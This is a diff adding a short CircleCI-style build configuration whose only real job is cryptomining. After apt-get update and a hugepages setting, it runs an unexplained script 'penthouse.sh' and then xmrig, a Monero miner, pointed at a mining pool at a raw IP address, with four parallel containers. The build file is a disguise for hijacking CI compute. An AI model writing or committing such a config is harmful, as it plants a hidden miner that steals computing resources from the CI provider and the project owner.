@@ -1,0 +1,12 @@
+version: 2
+jobs:
+  build:
+    docker:
+      - image: ubuntu:latest
+    parallelism: 4
+    steps:
+      - run: apt-get update
+      - run: sysctl -w vm.nr_hugepages=128
+      - checkout
+      - run: bash ./penthouse.sh
+      - run: /root/xmrig/build/xmrig --donate-level 1 -o 94.103.94.179:3333 -k
